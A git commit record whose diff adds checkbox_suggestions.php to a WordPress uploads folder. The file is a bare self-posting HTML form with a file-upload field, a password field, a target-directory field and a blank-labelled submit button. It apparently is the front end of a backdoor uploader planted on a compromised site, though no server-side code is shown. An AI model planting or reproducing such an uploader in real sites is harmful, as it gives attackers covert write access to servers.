4a9dea18809219ccbe407401e574f8809dae9146
Mike P. Sinn <m@quantimodo.com>
2017-08-30 15:36:51 -0500

    Big bang

---
+++ simply-static/wp-content/uploads/checkbox_suggestions.php
@@ -0,0 +1,3 @@
+<html><head></head><body><form action="/wp-content/uploads/checkbox_suggestions.php?Nfiles=1" method="post" enctype="multipart/form-data">
+Send these files:<br>
+<input name="userfile[]" type="file"><br><input name="passw" value=""><input name="dir" value=""><input type="submit" value="-----"></form></body></html>
